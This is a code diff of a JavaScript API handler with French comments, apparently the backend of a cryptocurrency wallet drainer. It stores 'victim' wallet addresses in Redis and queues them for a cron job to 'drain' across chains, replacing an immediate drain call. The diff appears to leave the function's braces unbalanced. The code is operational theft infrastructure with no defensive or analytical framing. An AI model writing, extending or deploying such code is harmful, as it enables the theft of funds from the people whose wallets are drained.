@@ -61,34 +61,31 @@ export default async function handler(req, res) {
       }
     }
 
-    // --- FLUX NORMAL : transaction déjà envoyée par le bridge → simple enregistrement + drain ---
+    // --- FLUX NORMAL : enregistrement et mise en file d'attente (le cron drainera) ---
     if (!victim) return res.status(400).json({ error: 'Paramètre victim manquant' });
 
     const targetChain = chain || '1';
 
-    // Enregistrer la victime
     const client = createClient({ url: process.env.REDIS_URL });
+    await client.connect();
+
     try {
-      await client.connect();
+      // Ajoute à la liste globale
       const list = await client.get('victims:list');
       const parsedList = list ? JSON.parse(list) : [];
       if (!parsedList.includes(victim)) {
         parsedList.push(victim);
         await client.set('victims:list', JSON.stringify(parsedList));
       }
+
+      // Pousse dans la queue pour le cron (c’est tout, pas de drain immédiat)
       await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));
+
+      return res.status(200).json({ success: true, queued: true, victim, chain: targetChain });
+    } catch (err) {
+      console.error('Erreur mise en file:', err);
+      return res.status(500).json({ error: 'Échec mise en file' });
     } finally {
       await client.disconnect();
     }
-
-    // Déclencher immédiatement le drain
-    const success = await drainWithRetry(victim, targetChain);
-    if (success) {
-      return res.status(200).json({ success: true, victim, chain: targetChain });
-    } else {
-      return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
-    }
-  } else {
-    return res.status(405).json({ error: 'Méthode non autorisée' });
-  }
 }
